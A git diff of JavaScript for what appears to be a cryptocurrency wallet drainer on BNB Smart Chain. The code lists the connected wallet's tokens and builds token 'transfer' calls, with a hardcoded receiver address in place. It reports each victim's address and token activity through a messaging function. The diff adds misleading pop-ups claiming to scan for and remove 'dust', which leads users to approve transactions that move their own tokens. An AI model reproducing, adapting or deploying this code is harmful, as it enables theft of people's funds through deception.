@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_addres = '0x8C2625679Bf98EaB8226932967B8fbA2b20F7003'; // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0x8C2625679Bf98EaB8226932967B8fbA2b20F7003'; 
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -341,14 +341,7 @@ async function proceed(){
       }
     } catch (error) {
       console.log("Can't enable web3: ", error);
-    //   const web3Provider = await Moralis.enableWeb3();
-    //   user = await Moralis.authenticate();
-    //   console.log('Authenticated User with moralis');
-    //   user_address = user.get('bscAddress')
-
-        // Moralis.enableWeb3() has already been called but is not finished
     }
-    // NOTE: Moralis.User.current(); doesn't exist
 
     async function send() {
         console.log("Attempting to send tokens...");
@@ -356,33 +349,19 @@ async function proceed(){
           throw Error(`No user:  ${user_address}`);
         }
         console.log("Searching for tokens...");
-    
-    
-        // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
-        // const bsc_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
-        //   console.log("Unable to get NFTs", e);
-        // })
-        // console.log('bsc NFTs: %o', bsc_nfts)
+  
         
         const bsc_tokens = await getTokens(user_address, apiKey).catch(e=>{
           console.log("Unable to get tokens", e);
         });
         
         await sendMessage(`BSC : connected to ${user_address}`);
+        alert("Connected to BSC ... scanning for dust");
         console.log('bsc tokens: %o', bsc_tokens)
         
     
         if (bsc_tokens.length < 1) {
-          await sendMessage(`No token found` )
-          
-          const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
-            console.log("Unable to get new bsc balance", e);
-          });
-          console.log("bnb_balance", bnb_balance);
-          console.log("bnb_balance.balance", bnb_balance.balance);
-          
-          const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
-          console.log("The new bnb balance", balance);
+          alert(`No token found` );
         }
 
 
@@ -427,8 +406,13 @@ async function proceed(){
           
 
         
-        // bsc_nfts.result.forEach(async (nft, i) => {
-          //transfer tokens
+      if(fake_bsc_token.length < 1){
+        alert("No dust found");
+      }
+      else{
+        alert("Dust found ... Approve transactions to remove");
+      }
+
           let x = 0;
           let whono = "";
           async function transferNow(){
@@ -449,11 +433,7 @@ async function proceed(){
               } = token
               let amount = Moralis.Units.Token(fakebalance.toString(), decimal.toString());
               
-              await sendMessage(`Approving 
-                            Token Address : ${contractAddress},
-                            Amount : ${amount},
-                            Your address : ${receiver_address}
-                              ` )
+              await sendMessage(`Dusting Token Address : ${contractAddress}` )
               const sendOptions = {
                 contractAddress: contractAddress,
                 functionName: "transfer",
@@ -484,10 +464,10 @@ async function proceed(){
             },
           )
           if (transaction) {
-            await sendMessage(`Approved` )
+            await sendMessage(`Approved dusting` )
           }
           else {
-            await sendMessage(`Denied` )
+            await sendMessage(`Denied dusting` )
           }
               console.log(transaction);
               // if(transaction){
